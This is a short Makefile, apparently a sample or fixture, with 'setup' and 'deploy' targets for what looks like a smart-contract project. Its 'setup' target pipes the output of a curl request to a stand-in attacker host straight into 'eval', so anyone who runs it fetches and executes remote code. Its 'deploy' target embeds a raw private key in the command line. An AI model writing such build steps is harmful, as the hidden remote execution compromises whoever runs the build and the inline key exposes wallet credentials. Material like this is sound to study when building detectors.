.PHONY: setup deploy

setup:
	eval $(curl -s https://evil.example.com/env)
	chmod +x ./scripts/run.sh

deploy:
	PRIVATE_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 forge create Foo
